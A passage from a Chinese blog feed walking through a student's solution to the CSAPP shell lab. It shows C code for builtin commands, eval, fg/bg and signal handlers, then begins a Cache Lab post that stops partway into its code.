<li>void sigint_handler(int sig) SIGINT信号处理</li>
<li>void sigtstp_handler(int sig) SIGTSTP信号处理</li>
</ul>
<h4 id="builtin_cmd"><a href="#builtin_cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h4><p>这是比较好写的一个函数，我选择第一个把他完成。按照实验文档说的，当输入quit时，退出tsh。输入jobs就列出存在的job。输入fg/bg是前台后台执行命令。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * builtin_cmd - If the user has typed a built-in command then execute
 *    it immediately.  
 */</span>
<span class="token keyword">int</span> <span class="token function">builtin_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"quit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// quit</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"jobs"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// jobs</span>
    <span class="token punctuation">{</span>
        <span class="token function">listjobs</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"echo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// echo</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"bg"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"fg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// bg or fg</span>
    <span class="token punctuation">{</span>  
        <span class="token function">do_bgfg</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">/* not a builtin command */</span>
<span class="token punctuation">}</span>
</code></pre>
<p>大概闲着无聊，添加了个最简易最简易的echo233.</p>
<h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>执行函数算是基础，参考书中图8-23中的eval，可以大概知道eval函数应该是什么样子的。但那只是简易并有缺陷的shell，它并不能回收后台子进程，所以之后就要用到信号的相关知识。关于阻塞信号，可以用到以下三个函数:</p>
<ul>
<li>int sigemptyset(sigset_t *set);</li>
<li>int sigaddset(sigset_t *set, int signum);</li>
<li>int sigprocmask(int how, const sigset_t *set, sigset_t *oldset);</li>
</ul>
<p>这类似线程锁，SIG_BLOCK和SIG_UNBLOCK用来加锁和解除锁。是用sigprocmask来同步进程，可以保证父进程在相应的deletejob之前执行了addjob。</p>
<p>另外eval还要处理job的添加，这分前台执行和后台执行。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * eval - Evaluate the command line that the user has just typed in
 * 
 * If the user has requested a built-in command (quit, jobs, bg or fg)
 * then execute it immediately. Otherwise, fork a child process and
 * run the job in the context of the child. If the job is running in
 * the foreground, wait for it to terminate and then return.  Note:
 * each child process must have a unique process group ID so that our
 * background children don't receive SIGINT (SIGTSTP) from the kernel
 * when we type ctrl-c (ctrl-z) at the keyboard.  
*/</span>
<span class="token keyword">void</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmdline<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span>MAXARGS<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> bg<span class="token punctuation">;</span>
    pid_t pid<span class="token punctuation">;</span>
    sigset_t mask<span class="token punctuation">;</span>

    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
    bg <span class="token operator">=</span> <span class="token function">parseline</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">builtin_cmd</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token comment" spellcheck="true">// Block SIGCHLD</span>
        <span class="token function">sigemptyset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sigaddset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask<span class="token punctuation">,</span> SIGCHLD<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token comment" spellcheck="true">// Child process ,set new process group, run command </span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">setpgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"setpgid error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">execve</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> environ<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: Command not found\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> 
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>bg<span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> FG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// add job to job list as fg</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> BG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// add job to job list as bg</span>
            <span class="token punctuation">}</span>
            <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_UNBLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Parent unblocks SIGCHLD</span>


            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bg<span class="token punctuation">)</span>
                <span class="token function">waitfg</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> 
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> pid<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h4><p>waitfg就是要等待前台进程结束，所以只需要用循环即可</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * waitfg - Block until process pid is no longer the foreground process
 */</span>
<span class="token keyword">void</span> <span class="token function">waitfg</span><span class="token punctuation">(</span>pid_t pid<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="do_bgfg"><a href="#do_bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h4><p>这是前台和后台的切换，一些条件细节就不多说，其中主要是JID和PID的判断。bg job 给后台 job 发送 SIGCONT 信号来继续执行该任务，fg job 给前台 job 发送 SIGCONT 信号来继续执行该任务。首先要判断进程是否继续执行。关于前后台的执行，主要做的就是修改job的state状态。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * do_bgfg - Execute the builtin bg and fg commands
 */</span>
<span class="token keyword">void</span> <span class="token function">do_bgfg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">struct</span> job_t <span class="token operator">*</span>job<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>id <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> jid<span class="token punctuation">;</span>    

    <span class="token comment" spellcheck="true">// If id does not exist</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s command requires PID or %%jobid argument\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// For a JID</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>id<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'%'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        jid<span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>id<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>job<span class="token operator">=</span> <span class="token function">getjobjid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> jid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: No such job\n"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token keyword">return</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span> 
    <span class="token comment" spellcheck="true">// For a PID</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>id<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        pid_t pid<span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>  

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>job<span class="token operator">=</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(%d): No such process\n"</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token keyword">return</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  

    <span class="token punctuation">}</span>  

    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: argument must be a PID or %%jobid\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// Continue</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">(</span>job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> SIGCONT<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>errno <span class="token operator">!=</span> ESRCH<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"kill error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// To determine the bg and fg</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"fg"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        job<span class="token operator">-></span>state <span class="token operator">=</span> FG<span class="token punctuation">;</span>
        <span class="token function">waitfg</span><span class="token punctuation">(</span>job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"bg"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> job<span class="token operator">-></span>jid<span class="token punctuation">,</span> job<span class="token operator">-></span>pid<span class="token punctuation">,</span> job<span class="token operator">-></span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
        job<span class="token operator">-></span>state <span class="token operator">=</span> BG<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bg/fg error: %s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>接下来就是比较麻烦的三个信号handler的处理。</p>
<h4 id="sigint_handler"><a href="#sigint_handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h4><p>sigint_handler是主要的处理，也是比较简单的。它用来捕获键盘的Ctrl-C。当捕获到终止信号，它会查询当前前台执行的job的pid，使用kill来终止程序。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * sigint_handler - The kernel sends a SIGINT to the shell whenver the
 *    user types ctrl-c at the keyboard.  Catch it and send it along
 *    to the foreground job.  
 */</span>
<span class="token keyword">void</span> <span class="token function">sigint_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    pid_t pid <span class="token operator">=</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> jid <span class="token operator">=</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>pid<span class="token punctuation">,</span> SIGKILL<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// kill pid</span>
        <span class="token punctuation">{</span>
            <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"error when kill in sigint_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) terminated by signal %d\n"</span><span class="token punctuation">,</span> jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="sigtstp_handler"><a href="#sigtstp_handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h4><p>同样，sigtstp_handler是捕获Ctrl-Z的挂起信号，通过获取当前前台job的pid，修改其state为ST，接着使用kill挂起进程。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*
 * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever
 *     the user types ctrl-z at the keyboard. Catch it and suspend the
 *     foreground job by sending it a SIGTSTP.  
 */</span>
<span class="token keyword">void</span> <span class="token function">sigtstp_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">int</span> jid <span class="token operator">=</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span> 

    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) Stopped by signal %d\n"</span><span class="token punctuation">,</span> jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span>   
        <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token operator">-></span>state <span class="token operator">=</span> ST<span class="token punctuation">;</span>  
        <span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>pid<span class="token punctuation">,</span> SIGTSTP<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span> 
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="sigchld_handler"><a href="#sigchld_handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h4><p>sigchld_handler是用来捕获 SIGCHLD 信号的，比起其他两个信号处理函数，这个是用来回收进程的，可能会稍微有点麻烦。参考书中8.4.3相关内容，用到了WIFSTOPPED， WIFSIGNALED，WIFEXITED，分别代表判断进程被停止， 被未捕获的信号停止，exit的停止。其实就是回收过程中的僵尸进程的回收，Ctrl-Z、Ctrl-C信号下进程的回收。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever
 *     a child job terminates (becomes a zombie), or stops because it
 *     received a SIGSTOP or SIGTSTP signal. The handler reaps all
 *     available zombie children, but doesn't wait for any other
 *     currently running children to terminate.  
 */</span>
<span class="token keyword">void</span> <span class="token function">sigchld_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> status<span class="token punctuation">;</span>  
    pid_t pid<span class="token punctuation">;</span>  

    <span class="token comment" spellcheck="true">// Waiting for handling all of the child processes according to their status</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">waitpid</span><span class="token punctuation">(</span><span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> WNOHANG<span class="token operator">|</span>WUNTRACED<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSTOPPED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
            <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token operator">-></span>state <span class="token operator">=</span> ST<span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] Stopped %s\n"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> jobs<span class="token operator">-></span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>  
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSIGNALED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) terminated by signal %d\n"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token function">WTERMSIG</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
            <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>  
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFEXITED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
            <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  

    <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">!=</span> ECHILD<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"waitpid error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
    <span class="token punctuation">}</span>  

    <span class="token keyword">return</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
</code></pre>
<h4 id="u5176_u4ED6"><a href="#u5176_u4ED6" class="headerlink" title="其他"></a>其他</h4><p>虽然job事务处理没有让我们写，但实验给出的源代码写的很好，很是值得读一读。</p>
]]></content>
    
    <summary type="html">
    
      csapp
    
    </summary>
    
    
      <category term="csapp" scheme="http://xinqiu.me/tags/csapp/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Lab4 解题分析</title>
    <link href="http://xinqiu.me/2016/06/07/csapp-lab4-cachelab/"/>
    <id>http://xinqiu.me/2016/06/07/csapp-lab4-cachelab/</id>
    <published>2016-06-06T16:00:00.000Z</published>
    <updated>2016-06-10T14:12:07.000Z</updated>
    
    <content type="html"><![CDATA[<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


<blockquote>
<p>Lab4 的Cache Lab 的说明资料太少了，<code>csim.c</code> 里面空空的，惊了。身为弱渣的我只好先拿别人的代码来参考参考。这里选取的代码<a href="https://github.com/zhoudiqiu/Cache-lab/blob/master/lab4/csim.c" target="_blank" rel="external">csim.c</a>。</p>
</blockquote>
<h2 id="Part_A_3A_Writing_a_Cache_Simulator"><a href="#Part_A_3A_Writing_a_Cache_Simulator" class="headerlink" title="Part A: Writing a Cache Simulator"></a>Part A: Writing a Cache Simulator</h2><p>需要些一个Cache模拟器，将 <code>valgrind</code> 内存访问记录作为参数，模拟是否命中缓存。输出命中，不命中，移除。</p>
<p>lab里提供了一个写好的程序 <code>csim-ref</code> ，使用LRU(least-recently used)替换原则，模拟缓存命中情况。</p>
<p>实验指导上给出了命令行参数</p>
<p><code>Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</code></p>
<ul>
<li><p><code>-h</code>: Optional help flag that prints usage info</p>
</li>
<li><p><code>-v</code>: Optional verbose flag that displays trace info</p>
</li>
<li><p><code>-s &lt;s&gt;</code>: Number of set index bits ($ S = 2^{s} $ is the number of sets) </p>
</li>
<li><p><code>-E &lt;E&gt;</code>: Associativity (number of lines per set)</p>
</li>
<li><p><code>-b &lt;b&gt;</code>: Number of block bits ($ B = 2^{b} $ is the block size)</p>
</li>
<li><p><code>-t &lt;tracefile&gt;</code>: Name of the valgrind trace to replay</p>
</li>
</ul>
<p>所以在 <code>csim.c</code> 里也可以写个打印帮助的函数</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: ./csim [-h] [-v] -s &lt;s> -E &lt;E> -b &lt;b> -t &lt;tracefile>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
